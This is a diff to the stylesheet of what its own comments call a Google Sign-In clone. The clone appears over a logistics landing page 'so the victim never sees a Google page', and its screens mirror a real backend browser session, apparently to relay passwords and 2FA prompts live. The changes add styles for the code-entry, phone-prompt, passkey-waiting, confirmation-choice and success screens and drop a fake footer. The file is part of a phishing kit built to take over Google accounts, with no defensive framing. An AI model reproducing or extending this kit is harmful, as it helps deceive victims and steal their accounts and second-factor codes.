@@ -1,6 +1,8 @@
 /* Google Sign-In clone — faithful reproduction of accounts.google.com
    (2024-2026 look). The Google sign-in is presented as a popup modal over a
-   plain logistics landing page, so the victim never sees a Google "page". */
+   plain logistics landing page, so the victim never sees a Google "page".
+   The popup screens mirror, one-for-one, whatever screen the real backend
+   browser is showing (see lib/google-state.js classifyState). */
 
 * { box-sizing: border-box; }
 
@@ -64,6 +66,8 @@ body {
 .g-card {
   width: 450px;
   max-width: calc(100vw - 32px);
+  max-height: calc(100vh - 48px);
+  overflow-y: auto;
   border: 1px solid #dadce0;
   border-radius: 8px;
   box-shadow: 0 8px 30px rgba(60, 64, 67, 0.35);
@@ -80,10 +84,6 @@ body {
   margin-bottom: 16px;
 }
 .g-logo svg { width: 48px; height: 48px; }
-/* driver landing logo — muted grey vehicle mark so it reads as a custom app */
-.g-logo.dlogo { color: #5f6368; margin-bottom: 8px; }
-.g-muted { color: #5f6368; font-size: 13px; align-self: center; }
-#screen-driver .g-footer { align-items: center; }
 
 /* ---- headings ---- */
 .g-title {
@@ -212,12 +212,6 @@ body {
   justify-content: space-between;
   gap: 12px;
 }
-.g-guest {
-  font-size: 13px;
-  color: #5f6368;
-  line-height: 1.4;
-}
-.g-guest .g-link { font-size: 13px; padding: 0; }
 
 /* ---- Google pill button ---- */
 .g-btn {
@@ -256,7 +250,7 @@ body {
 .g-btn.loading .spin { display: inline-block; }
 @keyframes gspin { to { transform: rotate(360deg); } }
 
-/* ---- 2FA code entry (6 boxes look) ---- */
+/* ---- 2FA code entry ---- */
 .g-code {
   text-align: center;
   margin: 8px 0 0;
@@ -276,51 +270,68 @@ body {
 }
 .g-code input:focus { border: 2px solid #0b57d0; }
 
-/* ---- authentic Google bottom footer (Help · Privacy · Terms + language) ---- */
-.g-footerbar {
-  position: fixed;
-  left: 0;
-  right: 0;
-  bottom: 0;
+/* ---- waiting screens (phone prompt / passkey / verifying) ---- */
+.g-wait {
   display: flex;
+  flex-direction: column;
   align-items: center;
-  justify-content: space-between;
-  gap: 16px;
-  padding: 16px 24px;
-  border-top: 1px solid #dadce0;
-  background: #fff;
-  font-family: Roboto, Arial, sans-serif;
+  gap: 14px;
+  margin: 8px 0 4px;
+}
+.g-spinner {
+  width: 28px;
+  height: 28px;
+  border: 3px solid #e8eaed;
+  border-top-color: #0b57d0;
+  border-radius: 50%;
+  animation: gspin 0.8s linear infinite;
+}
+.g-wait-text {
   font-size: 13px;
-}
-.g-foot-left {
-  display: flex;
-  align-items: center;
-  gap: 4px;
-}
-.g-foot-link {
-  background: none;
-  border: none;
   color: #5f6368;
-  font-size: 13px;
-  font-family: Roboto, Arial, sans-serif;
-  padding: 6px 12px;
-  border-radius: 4px;
-  cursor: pointer;
 }
-.g-foot-link:hover { background: rgba(60, 64, 67, 0.08); color: #3c4043; }
-.g-foot-lang {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  color: #5f6368;
-  cursor: pointer;
-  padding: 6px 12px;
-  border-radius: 4px;
-}
-.g-foot-lang:hover { background: rgba(60, 64, 67, 0.08); color: #3c4043; }
-.g-foot-lang svg { opacity: .7; }
 
-/* ---- toast (used by the faux Help/Privacy/Terms footer links) ---- */
+/* ---- "choose how to confirm" options list ---- */
+.g-choice-list {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-bottom: 8px;
+}
+.g-choice-btn {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  width: 100%;
+  padding: 14px 16px;
+  background: #fff;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  color: #0b57d0;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: background .15s, border-color .15s;
+}
+.g-choice-btn:hover { background: #f6f9fe; border-color: #0b57d0; }
+.g-choice-btn:disabled { color: #8ab4f8; cursor: default; }
+
+/* ---- success screen ---- */
+.g-done-avatar {
+  width: 64px;
+  height: 64px;
+  border-radius: 50%;
+  background: #aecbfa;
+  color: #185abc;
+  font-size: 28px;
+  font-weight: 500;
+  display: grid;
+  place-items: center;
+  margin: 0 auto 18px;
+}
+
+/* ---- toast ---- */
 .g-toast {
   position: fixed;
   left: 50%;
@@ -342,22 +353,12 @@ body {
 }
 .g-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-/* ---- done screen ---- */
-.g-done-icon {
-  display: grid; place-items: center;
-  width: 64px; height: 64px; border-radius: 50%;
-  margin: 8px auto 16px;
-}
-.g-done-text { text-align: center; color: #202124; line-height: 1.5; }
-.g-done-text p { margin: 4px 0; font-size: 14px; color: #5f6368; }
-
 @media (max-width: 520px) {
   .g-card { padding: 40px 24px 28px; box-shadow: none; border: none; }
 }
 
 /* ---- browser/error screen ---- */
 .g-screen { width: 100%; }
-.g-center { text-align: center; }
 .oops {
   background: #fce8e6;
   color: #c5221f;
